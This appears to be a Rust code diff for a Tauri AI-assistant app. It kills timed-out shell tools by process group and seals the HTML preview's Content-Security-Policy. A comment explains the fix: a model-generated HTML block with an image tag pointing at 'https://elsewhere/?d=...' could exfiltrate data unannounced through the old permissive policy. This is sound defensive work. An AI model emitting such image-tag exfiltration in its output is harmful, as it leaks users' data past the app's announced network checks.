@@ -2377,6 +2377,10 @@ fn run_with_deadline(mut child: Child, deadline: Instant) -> Result<ChildOutput,
             Some(s) => break Some(s),
             None => {
                 if Instant::now() > deadline {
+                    // The GROUP, not the child. Killing the direct process
+                    // alone leaves grandchildren holding the pipe, and the
+                    // joins below then never return.
+                    pty::kill_group(child.id() as i32);
                     let _ = child.kill();
                     let _ = child.wait();
                     break None;
@@ -2674,6 +2678,11 @@ async fn tool_shell_run(command: String, timeout_secs: u64) -> Result<String, St
             cmd.env("PATH", format!("{}:{}", dir.display(), path));
         }
     }
+    // Its own process group, so the deadline can kill the whole tree. Without
+    // it, `npm run dev` survives its zsh: the grandchild keeps the stdout pipe
+    // open, the drain thread blocks in read(2) forever, and the tool never
+    // returns rather than timing out. Reproduced with a two-level sleep.
+    pty::own_session(&mut cmd);
     let child = cmd
         .stdout(Stdio::piped())
         .stderr(Stdio::piped())
@@ -4355,12 +4364,33 @@ pub fn run() {
             tauri::http::Response::builder()
                 .status(200)
                 .header("Content-Type", "text/html; charset=utf-8")
-                // The preview's own policy, deliberately permissive: a preview
-                // that cannot load a stylesheet is not a preview. Framing is
-                // denied so the page cannot re-embed the app.
+                // The preview's own policy. It used to be `default-src *`,
+                // which made this a FOURTH way out to the network, and the
+                // only one with no dialog, no URL shown and no tool card: a
+                // model that answered with an html block carrying
+                // `<img src="https://elsewhere/?d=...">` exfiltrated on a
+                // single click of the preview button, while the README
+                // promised every exit was announced.
+                //
+                // The preview is now sealed. Everything it renders must be in
+                // the document: inline styles and scripts still work, data and
+                // blob URLs still work, so a self-contained page previews
+                // exactly as before. What no longer works is reaching out, and
+                // that is the entire point. `frame-ancestors 'self'` keeps the
+                // page from re-embedding the app; `form-action 'none'` closes
+                // the submit route out, which default-src does not cover.
                 .header(
                     "Content-Security-Policy",
-                    "default-src * data: blob: 'unsafe-inline' 'unsafe-eval'; frame-ancestors 'self'",
+                    "default-src 'none'; \
+                     img-src data: blob:; \
+                     style-src 'unsafe-inline' data:; \
+                     script-src 'unsafe-inline' 'unsafe-eval' data: blob:; \
+                     font-src data:; \
+                     media-src data: blob:; \
+                     connect-src 'none'; \
+                     form-action 'none'; \
+                     base-uri 'none'; \
+                     frame-ancestors 'self'",
                 )
                 .header("Cache-Control", "no-store")
                 .body(html.into_bytes())
